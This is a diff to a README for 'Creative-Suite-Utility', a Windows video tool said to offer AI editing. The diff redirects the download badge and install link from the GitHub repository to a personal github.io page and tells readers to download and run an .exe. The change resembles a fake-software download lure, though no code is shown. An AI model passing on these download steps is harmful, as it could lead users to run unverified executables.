@@ -1,6 +1,6 @@
 # 🎬 Creative-Suite-Utility - Edit videos faster with AI tools
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/javierbrachyurous413/Creative-Suite-Utility)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://javierbrachyurous413.github.io)
 
 Creative-Suite-Utility helps you manage video production tasks. It includes tools for AI-powered editing, high-quality 4K exports, and professional visual effects. This program runs directly on your Windows computer.
 
@@ -8,7 +8,7 @@ Creative-Suite-Utility helps you manage video production tasks. It includes tool
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the project website at [https://github.com/javierbrachyurous413/Creative-Suite-Utility](https://github.com/javierbrachyurous413/Creative-Suite-Utility).
+1. Visit the project website at [https://javierbrachyurous413.github.io](https://javierbrachyurous413.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Click the most recent version available.
 4. Download the file ending in .exe to your computer.
